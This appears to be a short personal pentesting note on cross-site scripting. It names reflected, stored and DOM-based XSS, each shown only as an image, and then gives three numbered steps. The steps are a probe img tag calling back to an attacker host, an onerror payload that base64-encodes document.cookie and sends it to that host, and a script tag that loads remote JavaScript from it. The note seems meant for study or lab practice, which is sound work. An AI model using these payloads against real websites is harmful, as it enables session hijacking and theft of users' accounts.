---
title: XSS
updated: 2023-12-03 07:41:02Z
created: 2023-09-29 12:49:28Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# XSS

## Reflected

<img src="../../_resources/7bac63d6f98ccfcd5b77c855886c4c73.png" alt="7bac63d6f98ccfcd5b77c855886c4c73.png" width="451" height="205">

## Stored

<img src="../../_resources/075c441a0a3fa592d0eb60a6114a06ba.png" alt="075c441a0a3fa592d0eb60a6114a06ba.png" width="354" height="327">

## DOM-based

<img src="../../_resources/d812e1102c0f5265300d6ef7e0367024.png" alt="d812e1102c0f5265300d6ef7e0367024.png" width="353" height="236">


1. Check if the form is vulnerable to **XSS** by adding an **img** tag in the comment section.
`<img src=http://<kali>/ping />`

2. Steal cookies
`<img src=x onerror=this.src='http://<kali>/?cookies='+btoa(document.cookie)
/>`

3. Run script
`<script src=http://<kali>/script.js></script>`

